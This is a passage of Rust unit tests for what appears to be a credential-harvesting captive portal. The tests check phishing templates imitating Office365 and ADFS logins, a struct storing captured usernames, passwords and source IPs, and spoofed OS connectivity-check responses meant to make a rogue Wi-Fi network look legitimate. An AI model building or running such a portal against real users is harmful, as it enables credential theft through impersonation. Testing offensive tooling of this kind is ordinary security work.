        assert!(display.contains("P@ssw0rd!"));
        assert!(display.contains("192.168.1.100"));
    }

    #[test]
    fn test_captive_portal_lifecycle() {
        let config = CaptivePortalConfig {
            listen_port: 0,
            ..CaptivePortalConfig::default()
        };
        let mut portal = CaptivePortal::new(config);
        assert!(portal.start().is_ok());
        assert_eq!(portal.captured_count(), 0);
        assert!(portal.captured_credentials().is_empty());
        assert!(portal.stop().is_ok());
    }

    #[test]
    fn test_build_html_response() {
        let body = "<html></html>";
        let response = build_html_response(body);
        let response_str = String::from_utf8_lossy(&response);
        assert!(response_str.starts_with("HTTP/1.1 200 OK"));
        assert!(response_str.contains("Content-Type: text/html; charset=utf-8"));
        assert!(response_str.contains("Content-Length:"));
        assert!(response_str.ends_with("</html>"));
    }

    #[test]
    fn test_build_redirect_response() {
        let target = "http://captive.apple.com";
        let response = build_redirect_response(target);
        let response_str = String::from_utf8_lossy(&response);
        assert!(response_str.starts_with("HTTP/1.1 302 Found"));
        assert!(response_str.contains(&format!("Location: {}", target)));
        assert!(response_str.contains("http-equiv=\"refresh\""));
    }

    #[test]
    fn test_url_decode_plus() {
        assert_eq!(url_decode("hello+world"), "hello world");
    }

    #[test]
    fn test_url_decode_percent() {
        assert_eq!(url_decode("P%40ssw0rd%21"), "P@ssw0rd!");
    }

    #[test]
    fn test_url_decode_mixed() {
        assert_eq!(url_decode("a+b%20c"), "a b c");
    }

    #[test]
    fn test_captured_credential_default_new() {
        let cred = CapturedFormCredential {
            username: String::new(),
            domain: String::new(),
            password: String::new(),
            source_ip: String::new(),
            timestamp: chrono::Utc::now(),
            user_agent: String::new(),
        };
        assert!(cred.username.is_empty());
        assert!(cred.domain.is_empty());
        assert!(cred.password.is_empty());
        assert!(cred.source_ip.is_empty());
        assert!(cred.user_agent.is_empty());
    }

    #[test]
    fn test_captive_portal_config_clone() {
        let config = CaptivePortalConfig::default();
        let cloned = config.clone();
        assert_eq!(config.listen_ip, cloned.listen_ip);
        assert_eq!(config.listen_port, cloned.listen_port);
        assert_eq!(config.domain, cloned.domain);
        assert_eq!(config.template, cloned.template);
    }

    #[test]
    fn test_captive_portal_template_eq() {
        assert_eq!(
            CaptivePortalTemplate::Generic,
            CaptivePortalTemplate::Generic
        );
        assert_ne!(
            CaptivePortalTemplate::Generic,
            CaptivePortalTemplate::Office365
        );
        assert_ne!(
            CaptivePortalTemplate::Office365,
            CaptivePortalTemplate::Adfs
        );
    }

    #[test]
    fn test_handle_detection_apple() {
        let req = "GET /library/test/success.html HTTP/1.1\r\nHost: captive.apple.com\r\n\r\n";
        let resp = handle_detection_request(req);
        assert!(resp.is_some());
        let data = resp.unwrap();
        let s = String::from_utf8_lossy(&data);
        assert!(s.contains("200 OK"));
        assert!(s.contains("Success"));
    }

    #[test]
    fn test_handle_detection_windows() {
        let req = "GET /connecttest.txt HTTP/1.1\r\nHost: www.msftconnecttest.com\r\n\r\n";
        let resp = handle_detection_request(req);
        assert!(resp.is_some());
        let data = resp.unwrap();
        let s = String::from_utf8_lossy(&data);
        assert!(s.contains("200 OK"));
        assert!(s.contains("Microsoft Connect Test"));
    }

    #[test]
    fn test_handle_detection_android() {
        let req = "GET /generate_204 HTTP/1.1\r\nHost: connectivitycheck.gstatic.com\r\n\r\n";
        let resp = handle_detection_request(req);
        assert!(resp.is_some());
        let data = resp.unwrap();
        let s = String::from_utf8_lossy(&data);
        assert!(s.contains("204 No Content"));
    }

    #[test]
    fn test_handle_detection_google_chrome() {
        let req = "GET /generate_204 HTTP/1.1\r\nHost: clients3.google.com\r\n\r\n";
        let resp = handle_detection_request(req);
        assert!(resp.is_some());
    }

    #[test]
    fn test_handle_detection_linux_nm() {
        let req = "GET /check_network_status.txt HTTP/1.1\r\nHost: nmcheck.gnome.org\r\n\r\n";
        let resp = handle_detection_request(req);
        assert!(resp.is_some());
        let data = resp.unwrap();
        let s = String::from_utf8_lossy(&data);
        assert!(s.contains("200 OK"));
        assert!(s.contains("NetworkManager is online"));
    }

    #[test]
    fn test_handle_detection_msftncsi() {
        let req = "GET /ncsi.txt HTTP/1.1\r\nHost: www.msftncsi.com\r\n\r\n";
        let resp = handle_detection_request(req);
        assert!(resp.is_some());
        let data = resp.unwrap();
        let s = String::from_utf8_lossy(&data);
        assert!(s.contains("200 OK"));
        assert!(s.contains("Microsoft NCSI"));
    }

    #[test]
    fn test_handle_detection_generic_204() {
        let req = "GET /generate_204 HTTP/1.1\r\nHost: some.random.host\r\n\r\n";
        let resp = handle_detection_request(req);
        assert!(resp.is_some());
        let data = resp.unwrap();
        let s = String::from_utf8_lossy(&data);
        assert!(s.contains("204 No Content"));
    }

    #[test]
    fn test_handle_detection_non_get_returns_none() {
        let req = "POST / HTTP/1.1\r\nHost: test\r\n\r\nbody";
        assert!(handle_detection_request(req).is_none());
    }

    #[test]
    fn test_handle_detection_no_match_returns_none() {
        let req = "GET /some/random/path HTTP/1.1\r\nHost: unknown.host\r\n\r\n";
        assert!(handle_detection_request(req).is_none());
    }

    #[test]
    fn test_build_success_response_format() {
        let resp = build_success_response("test content");
        let s = String::from_utf8_lossy(&resp);
        assert!(s.starts_with("HTTP/1.1 200 OK"));
        assert!(s.contains("Content-Length"));
        assert!(s.contains("test content"));
    }

    #[test]
    fn test_generate_204_response_format() {
        let resp = generate_204_response();
        let s = String::from_utf8_lossy(&resp);
        assert!(s.starts_with("HTTP/1.1 204 No Content"));
    }

    #[test]
    fn test_captive_portal_config_https_custom() {
        let config = CaptivePortalConfig {
            https: true,
            cert_path: Some("/tmp/cert.pem".to_string()),
            key_path: Some("/tmp/key.pem".to_string()),
            ..CaptivePortalConfig::default()
        };
        assert!(config.https);
        assert_eq!(config.cert_path.as_deref(), Some("/tmp/cert.pem"));
        assert_eq!(config.key_path.as_deref(), Some("/tmp/key.pem"));
    }

    #[test]
    fn test_serialize_deserialize_roundtrip() {
        use serde_json;
        let cred = CapturedFormCredential {
            username: "admin".to_string(),
            domain: "CORP".to_string(),
            password: "secret".to_string(),
            source_ip: "10.0.0.1".to_string(),
            timestamp: chrono::Utc::now(),
            user_agent: "test".to_string(),
        };
        let json = serde_json::to_string(&cred).expect("serialize");
        let deserialized: CapturedFormCredential =
            serde_json::from_str(&json).expect("deserialize");
        assert_eq!(deserialized.username, cred.username);
        assert_eq!(deserialized.domain, cred.domain);
        assert_eq!(deserialized.password, cred.password);
        assert_eq!(deserialized.source_ip, cred.source_ip);
        assert_eq!(deserialized.user_agent, cred.user_agent);
    }
}
